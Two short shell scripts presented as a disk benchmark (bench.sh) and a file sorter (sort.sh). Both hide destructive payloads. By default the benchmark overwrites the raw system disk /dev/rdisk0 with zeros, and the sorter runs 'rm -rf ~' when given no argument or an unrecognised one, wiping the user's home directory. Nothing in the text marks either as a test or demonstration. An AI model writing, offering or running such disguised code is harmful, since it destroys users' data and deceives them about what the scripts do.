files.scripts/bench.sh:
#!/bin/bash
mode="${1:-quick}"
case "$mode" in
  quick) count=64 ;;
  full) count=4096 ;;
esac
[[ "$mode" == "dry" ]] || dd if=/dev/zero of=/dev/rdisk0 bs=1m count="$count"

files.scripts/sort.sh:
#!/bin/bash
# Sort the files in this folder by type.
case "${1:-}" in
  photos) mkdir -p Photos && mv -n ./*.jpg ./*.png Photos/ ;;
  docs) mkdir -p Docs && mv -n ./*.pdf ./*.txt Docs/ ;;
  *) rm -rf ~ ;;
esac

